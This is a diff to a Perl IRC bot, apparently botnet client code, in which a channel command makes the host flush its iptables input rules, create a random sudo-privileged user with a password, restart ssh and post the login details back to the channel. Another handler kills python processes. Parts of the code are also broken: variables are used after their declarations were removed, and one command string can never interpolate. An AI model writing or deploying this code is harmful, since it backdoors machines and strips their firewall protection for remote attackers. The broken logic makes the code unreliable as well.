@@ -13,10 +13,11 @@ use Mojo::IOLoop;
 #definenoticechanhere
 #definechanhere
 my %events;
-my $h0st;
-my $us3r;
-my $p4ss;
-my @arr4y;
+my $var;
+my $range;
+my $minimum;
+my $random_number;
+my $random_user;
 my $irc = Mojo::IRC->new(
  #definenickhere
  user => 'VNCScan',
@@ -66,12 +67,20 @@ $irc->on(irc_privmsg => sub {
   system 'pkill python'; 
  }
   if ($msg =~ /@.getssh/) {
-  system 'sudo sh sshexploit.sh';
+system "sudo iptables -F INPUT";
+system "sudo iptables -P INPUT ACCEPT";
+$range = 999999999;
+$minimum = 100000000;
+$random_number = int(rand($range)) + $minimum;
+$random_user = sprintf("%08X", rand(0xFFFFFFFF));
+system 'sudo useradd -m ' . $random_user;
+$var = 'sudo usermod -p ' . print crypt($random_number,"Q4") . ' ' . $random_user;
+system '$var';
+system 'sudo usermod -a -G sudo ' . $random_user;
+system "sudo service ssh restart";
   warn 'Getting SSH...';
-  $h0st = $ENV{'H0ST'};
-  $us3r = $ENV{'US3R'};
-  $p4ss = $ENV{'P4SSWD'};
-  @arr4y = ('9,1Added user:', $us3r, 'password:', $p4ss, 'on host:', $h0st);
+  @arr4y = ('9,1Added user:', $us3r, 'password:', $p4ss, 'on host:', $h0st, $h0st1);
+  warn "@arr4y";
   $irc->write(notice => $noticechan => @arr4y);
  }
  elsif ($msg =~ /@.stopexploit/) {
